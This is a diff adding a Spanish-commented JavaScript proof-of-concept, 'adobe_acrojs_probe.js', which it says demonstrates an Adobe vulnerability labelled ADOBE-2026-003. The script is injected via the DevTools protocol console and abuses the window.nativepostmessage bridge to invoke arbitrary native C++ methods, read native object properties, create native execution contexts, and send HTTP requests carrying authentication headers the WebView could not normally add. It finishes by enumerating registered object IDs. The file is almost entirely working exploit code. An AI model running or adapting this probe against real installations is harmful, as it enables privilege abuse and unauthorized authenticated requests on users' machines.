@@ -1,0 +1,70 @@
+/**
+ * adobe_acrojs_probe.js — Sonda del bridge nativo AcroJS
+ * Se inyecta en la consola CDP de cualquier panel RNA.
+ * Demuestra ADOBE-2026-003: invocación arbitraria de funciones C++.
+ */
+
+// 1. Verificar que el bridge está disponible
+console.log("[*] Bridge disponible:", typeof window.nativepostmessage);
+// Salida esperada: "Bridge disponible: function"
+
+// 2. Protocolo de invocación: llamar a un método nativo por ID de objeto
+function acroInvoke(objectId, methodName, args) {
+    const msg = {
+        isAcroMsg: "YES",        // Marcador obligatorio
+        method_name: "invoke",    // Tipo de operación
+        funArgs: {
+            "0": objectId,        // ID del objeto en g_acroJSObjMap
+            "1": methodName,      // Nombre del método C++ a invocar
+            "2": args || {}       // Argumentos del método
+        },
+        response_id: "probe_" + Date.now()  // Correlación de respuestas
+    };
+    window.nativepostmessage(JSON.stringify(msg));
+}
+
+// 3. Protocolo de lectura: obtener propiedades de objetos nativos
+function acroGet(objectId, propertyName) {
+    const msg = {
+        isAcroMsg: "YES",
+        method_name: "get",
+        funArgs: {
+            "0": objectId,
+            "1": propertyName
+        },
+        response_id: "get_" + Date.now()
+    };
+    window.nativepostmessage(JSON.stringify(msg));
+}
+
+// 4. Crear un contexto de ejecución nativo
+function acroCreateContext() {
+    const msg = {
+        isAcroMsg: "YES",
+        method_name: "createContext",
+        funArgs: {},
+        response_id: "ctx_" + Date.now()
+    };
+    window.nativepostmessage(JSON.stringify(msg));
+}
+
+// 5. Ejecutar petición HTTP desde el contexto nativo
+// (con cabeceras de autenticación que el WebView2 no podría añadir)
+function acroXHR(url, method, headers) {
+    const msg = {
+        isAcroMsg: "YES",
+        method_name: "performXHRRequest",
+        funArgs: {
+            "0": { url: url, method: method || "GET", headers: headers || {} }
+        },
+        response_id: "xhr_" + Date.now()
+    };
+    window.nativepostmessage(JSON.stringify(msg));
+}
+
+// 6. Enumerar los objetos registrados en g_acroJSObjMap
+// Los IDs conocidos son 3, 7 y 18
+[3, 7, 18].forEach(id => {
+    console.log(`[*] Probando objeto ID ${id}...`);
+    acroGet(id, "toString");
+});
